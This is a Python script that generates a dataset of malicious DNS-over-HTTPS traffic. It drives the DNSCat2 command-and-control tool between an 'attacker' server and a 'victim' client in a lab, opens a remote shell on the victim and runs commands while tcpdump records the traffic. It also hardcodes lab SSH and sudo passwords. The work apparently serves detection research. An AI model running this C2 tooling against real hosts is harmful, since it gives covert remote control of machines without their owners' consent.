#!/usr/bin/env python3

"""Malicious DoH traffic dataset generator using C&C with DNSCat2 tool

This script allows the user to launch and manage the production of a dataset 
containing Command & Control communications between a client machine (victim) 
and a server machine (attacker), using the DNSCat2 tool. 

These communications pass through an intermediate DNS resolver, where 
communications between the client and the resolver are encrypted using the 
DNS-over-HTTPS protocol, thanks to the use of a DoH proxy named "doh-proxy" 
(https://github.com/facebookarchive/doh-proxy).

This script requires `Fabric` to be installed in the Python environment in 
which you are running it.

This script also requires the `constants.py` and `utils.py` files to be in the 
same directory.

This script contains the DnscatDataset class with the following functions:
    * __init__
    * load_config - Load dataset generation configurations.
    * run - Run the entire process of the dataset production.
    * reset - Kill all the processes related to the DNSCat2 tool 
        and the proxy on client and server.
    * run_server - Run the server part of DNSCat2.
    * run_proxy - Run the DoH proxy on the machine where it is installed.
    * run_clients - Call the `run_client_dnscat2` function to run the client 
        side of DNSCat2 on each client machine (victim).
    * run_client_dnscat2 - Run the client part of the tool on the victim 
        machine in background.
    * run_tcpdump - Run tcpdump on the client machine (victim) to capture the 
        DoH traffic between the DoH proxy and the DoH resolver.
    * save_tcpdump - Retrieve the capture file at the end of the process on the
        Controller machine to keep a copy of the capture file.
    * run_scenario - Executes the scenario passed in parameter containing the 
        data production configuration for one communication.
    * run_dnscat2_commands - Run a command in the shell of the victim machine.
"""

import os
import json
import time
import datetime
import logging
import random
import socket
import signal

from fabric import Connection, Config

import constants
from utils import *


class DnscatDataset:

    def __init__(self):
        """
        Parameters
        ----------
        server_conn: fabric.Connection 
            Object from Fabric library allowing the connection to the server
            machine (attacker) in SSH.
        clients_conn: list of fabric.Connection objects
            List of objects from Fabric library allowing the connection to the
            client machines (victims) in SSH.
        local_ip_doh_proxy: list of str
            List of the IP addresses of the DoH proxies on the client machines
            (victims)
        local_ip_resolver: str
            IP address of the Local DoH resolver
        tcpdump_file_path: str
            Path of the PCAP file containing packets data of the DoH 
            communications
        scenarios: list[dict]
            List of JSON objects in dictionnary form describing the dataset 
            generation configurations
        server_socket: str
            Socket name of the server side process of DNSCat2
        """

        self.STOP = False
        signal.signal(signal.SIGINT, self.interrupt_handler)

        logging_filename = 'dnscat2_dataset.log'
        logging_format = '%(asctime)s:%(levelname)s:%(funcName)s:%(message)s'
        logging_level = logging.INFO

        self.logger = logging_configuration(logging_filename, logging_format, logging_level)

        try:
            conn_config = Config(overrides={'sudo': {'password':'notroot'}})
            self.server_conn = Connection('dohserver.local', user='attacker', 
                                        connect_kwargs={'password': 'notroot'}, 
                                        config=conn_config)
            #self.proxy_conn = Connection('dohproxy.local', user='dohproxy', connect_kwargs={'password': 'notroot'}, config=conn_config)
            self.client_conn = Connection('dohclient.local', 
                                            user='client', 
                                            connect_kwargs={'password': 'notroot'},
                                            config=conn_config)
        except Exception as e:
            self.logger.error(f"SSH connection to the machines failed: {e}")
            return

        try:
            self.local_ip_doh_proxy = socket.gethostbyname('dohclient.local')
            self.local_ip_resolver = None

            self.logger.info('IPs of the DoH proxy and the resolver have been retrieved')

        except Exception as _:
            self.logger.error('DoH proxy and/or resolver unreachable')

        self.tcpdump_file_path = ''
        self.scenarios = None # list of scenarios initiated at None
        self.server_socket = ''
    
    def interrupt_handler(self, sig, frame):
        self.logger.warning('Received SIGINT (CTRL+C). Stopping the execution gracefully')
        self.STOP = True


    def load_config(self, config_file_path):
        """Load the json file containing the scenarios
        
        Parameters
        ----------
        file_path: str
            The file path of the JSON file to load
        """

        scenario_filename, _ = os.path.splitext(config_file_path)

        with open(config_file_path) as json_file:
            try:
                self.scenarios = json.load(json_file)
                self.logger.info('Scenario JSON loaded:' + scenario_filename)
            except ValueError as e:
                self.logger.error('Invalid JSON: %s' % e)
                return

    def run(self):
        """Run the entire process of the dataset production"""

        # Verify if the JSON file has been loaded, else stop the program
        if self.scenarios is None:
            self.logger.error('The file containing scenarios has not been loaded !')
            return
                
        # Call the `reset` function to kill all processes from tools
        self.reset()

        # While the STOP variable is not set to TRUE thanks to CTRL+C keyboard 
        # command, the loop will continue.
        # Allow to not interrupt the process brutally.
        while not self.STOP:
            scenario = random.choice(self.scenarios)
            self.run_scenario(scenario) 

    def reset(self):
        """Kill all the processes related to the tool and the proxy on client 
        and server
        """

        # Kill specified processed on the client
        kill_all_processes(self.client_conn)

        # Kill specified processed on the server
        kill_all_processes(self.server_conn)

        self.logger.info('All processes have been stopped')
        print('All processes have been stopped\n')

    def run_server(self, extra_args=None):
        """Run the server part of the tool on the attacker machine in background 
        and keep the socket created in the variable self.server_socket. This 
        socket allows to communicate with the tool in background with the 
        `dtach` library.

        Parameters
        ----------
        extra_args: str, optional
            Extra arguments which could be added to the executed command of the
            server side of the tool
        """
        self.logger.info('Run server')
        extra_args = extra_args or ''

        # Call the `run_background` function to run in background the server
        # side process of the tool. We get a socket to communicate later with.
        self.server_socket = run_background(self.server_conn, 'ruby {pwd}/dnscat2.rb testlab.lan'
                                            ' --security=open'
                                            ' {extra_args}'.format(pwd = constants.NS_DNSCAT2_PATH, extra_args = extra_args),
                                            socket_name = constants.NS_DNSCAT2_SOCKETNAME, sudo=True)
        self.logger.info('Server runned successfully')
        print('Server runned successfully')
    
    def run_proxy(self, connection, ip_proxy, domain, extra_args=None):
        """Run the DoH proxy on the machine where it is installed.
        
        Run the DoH proxy in background by using the anaconda environment 
        created for the proxy (see environment documentation to create the 
        anaconda environment).

        Parameters
        ----------
        connection: fabric.Connection
            Connection object of the Fabric library related to SSH connection 
            to the machine where the DoH proxy is installed.
        ip_proxy: str
            IP address of the machine where the DoH proxy is installed
        domain: str
            Domain name of the DoH resolver to which to address the requests
        extra_args: str, optional
            Extra arguments which could be added to the executed command of the
            proxy (example: a SSL certificate)
        """

        self.logger.info('Run DoH proxy')
        extra_args = extra_args or ''

        # Call the `run_background` function to run in background the DoH 
        # proxy process.
        run_background(connection, '{pwd}/conda run -n {env} doh-stub --listen-address {listen_address} ' 
                                        '--listen-port {listen_port} --domain {domain} {extra_args}'.format(
                                            pwd = constants.LIN_CONDA_PATH,
                                            env = constants.ENV_PROXY,
                                            listen_address = ip_proxy,
                                            listen_port = constants.LIN_LISTEN_PORT_PROXY,
                                            domain = domain,
                                            extra_args = extra_args
                                        ), socket_name = constants.PROXY_SOCKETNAME)
    
        self.logger.info('DoH proxy runned successfully')
        print('DoH Proxy runned successfully')

    def run_client(self, delay):
        """Run the client part of the tool on the victim machine in background.

        Parameters
        ----------
        client: fabric.Connection
            Connection object of the Fabric library related to SSH connection 
            to the machine where the client side of DNSCat2 is installed.
        ip_proxy: str
            IP address of the machine where the DoH proxy is installed
        """

        if delay is None:
            delay = 1000


        self.logger.info('Run client')

        # Call the `run_background` function to run in background the server 
        # proxy process.
        run_background(self.client_conn, '{pwd}/dnscat --no-encryption --dns=server={server},port={port},domain={domain} --delay={delay}'.format(
                                            pwd = constants.CLIENT_DNSCAT2_PATH, 
                                            server = self.local_ip_doh_proxy, 
                                            port = constants.LIN_LISTEN_PORT_PROXY,
                                            domain=constants.DOMAIN,
                                            delay = delay),
                                            socket_name = constants.CLIENT_DNSCAT2_SOCKETNAME)
        
        self.logger.info('Client runned successfully')
    
    def run_tcpdump(self, connection, ip_proxy, output_folder, scenario):
        """Run tcpdump on the client machine (victim) to capture the DoH 
        traffic between the DoH proxy and the DoH resolver.

        Parameters
        ----------
        connection: fabric.Connection
            Connection object of the Fabric library related to SSH connection 
            to the machine where the client side of DNSCat2 is installed.
        ip_proxy: str
            IP address of the machine where the DoH proxy is installed
        output: str
            Path where to save the PCAP file containing packets data of the DoH 
            communications
        """

        random.seed(int(time.time()))

        formated_date = str(datetime.datetime.now().strftime("%Y%m%d_%H_%M_%S"))
        extension = '.pcap'
        label = scenario['label']

        random_delay = random.choice(scenario['delay'])
        random_number_commands = random.randint(scenario['number_commands_limit'][0], scenario['number_commands_limit'][1])

        delay = 'delay' + str(random_delay)
        number_commands = 'cmd' + str(random_number_commands)

        output_file = "_".join([label, delay, number_commands, formated_date]) + extension

        self.tcpdump_file_path = output_folder + output_file
        #print('random_number_commands: {}'.format(random_number_commands))

        self.logger.info('Run capture process')
        # Call the `run_background` function to run in background the tcpdump
        # process
        run_background(connection, 'tcpdump -n -i 1 host {local_ip} and host {resolver} and port 443 -w {path}'.format(path = self.tcpdump_file_path,
                                                                                                                       local_ip = ip_proxy,
                                                                                                                       resolver = self.local_ip_resolver),
                                                                                                                       socket_name='/tmp/tcpdump', sudo=True)
        
        self.logger.info('Capture process runned successfully')
        print('Capture process runned successfully')

        self.logger.info('Tcpdump output is {}'.format(self.tcpdump_file_path))
        print('Tcpdump output is {}'.format(self.tcpdump_file_path))


        return random_delay, random_number_commands

    def run_scenario(self, scenario):
        """Executes the scenario passed in parameter containing the data 
        production configuration for one communication.

        The global scenario consists in running the server and the client part 
        of the tool and to execute a random number of Commands and Control 
        (C&C) commands.

        Parameters
        ----------
        scenario: dict
            Dictionary containing configuration information for a 
            communication's data production.
        """

        self.logger.info('Starting scenario [{}]'.format(scenario['label']))
        print('Starting scenario [{}]'.format(scenario['label']))

        self.local_ip_resolver = socket.gethostbyname(scenario['doh_resolver'])

        try:
            print('run server')
            self.run_server()
            time.sleep(3)

            # Run tcpdump on the client to capture DoH traffic
            print('run capture')
            delay, random_number_commands = self.run_tcpdump(self.client_conn, self.local_ip_doh_proxy, constants.DNSCAT2_PCAP_FILES_PATH, scenario)

            print('run proxy')
            self.run_proxy(self.client_conn, self.local_ip_doh_proxy, scenario['doh_resolver'], scenario['proxy_args'])

            time.sleep(2)
            print('run client')
            self.run_client(delay)

        except Exception as _:
            self.logger.exception('Machines initialization failed')
            self.reset()
            return

        # Send a command to execute to the server side of the tool to go 
        # in the session window of the communication (like Metasploit)
        command_through_socket(self.server_conn,'session -i 1', self.server_socket)

        # In case we want to execute commands on the shell, ask the shell to 
        # the DNSCat2 tool.
        if scenario['shell_commands']:
                command_through_socket(self.server_conn,'shell', self.server_socket)
                time.sleep(2)
                # Go to the window related to the shell communication
                command_through_socket(self.server_conn,'session -i 2', self.server_socket)
    
        try:
            # Run C&C commands
            self.run_dnscat2_commands(scenario['commands'], random_number_commands, scenario['random_seconds_interval'])
            time.sleep(5)

        except Exception as _:
            self.logger.exception('[{}] Exception raised'.format(scenario['label']))

        time.sleep(10)

        # Shutdown the communication
        command_through_socket(self.server_conn, 'shutdown', self.server_socket)
        # Wait until the attempting to shutdown the communication succeed
        time.sleep(10) 
        # Quit the server side of the tool to turn off it
        command_through_socket(self.server_conn, 'quit', self.server_socket)
        

        # Call the `reset` function to kill all processes from tools
        self.reset()

        time.sleep(1) # Used to capture the last packets (RST)

        # Kill tcpdump process on the client
        self.client_conn.sudo("killall {proc_names} && sleep {wait} && killall -9 {proc_names}".format(
                        passwd = constants.SUDO_PASSWORD, 
                        proc_names = 'tcpdump', 
                        wait=2), warn=True)
        
        self.logger.info('End of the scenario')
        print("End of the scenario\n")



    def run_dnscat2_commands(self, commands, random_number_commands, random_interval):
        """Run a command in the shell of the victim machine.
        
        It randomly chooses the number of C&C commands to execute during the 
        communication. After this, each command is randomly chosen in the list 
        of commands until we reach the maximum number of command randomly 
        chosen previously.

        Parameters
        ----------
        commands: list[str]
            List of commands which could be executed during a C&C communication
        """
        
        if (len(commands)>1):
            iterationLimit = random_number_commands
        else:
            iterationLimit = 1

        for _ in range(iterationLimit):
            command = random.choice(commands)
            command_through_socket(self.server_conn, command, self.server_socket)
            seconds_to_wait = random.randint(random_interval[0], random_interval[1])
            time.sleep(seconds_to_wait)




if __name__== "__main__":
    dataset = DnscatDataset()
    dataset.load_config('local_dnscat2_scenarios.json')
    dataset.run()
